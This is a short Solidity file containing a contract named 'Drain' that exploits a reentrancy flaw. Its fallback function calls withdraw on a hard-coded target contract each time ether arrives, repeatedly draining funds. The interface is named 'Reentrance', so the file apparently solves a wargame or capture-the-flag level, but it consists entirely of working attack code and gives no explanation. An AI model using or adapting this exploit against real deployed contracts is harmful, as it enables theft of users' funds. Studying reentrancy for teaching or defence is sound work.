pragma solidity ^0.8.0;

abstract contract Reentrance{
	function withdraw(uint _amount) virtual public;
}

contract Drain {
	address contractAddr = 0x18B3d31145edFe09204cFb8873b558Bf7FCC357a;
	address drainer = 0x37639B48Dacd985248057C90CBB2e30D30271D0C;

	Reentrance reenter = Reentrance(contractAddr);

	function startDrain() public{
		reenter.withdraw(0.0005 ether);
	}

	receive() external payable{
		reenter.withdraw(0.0005 ether);
	}
}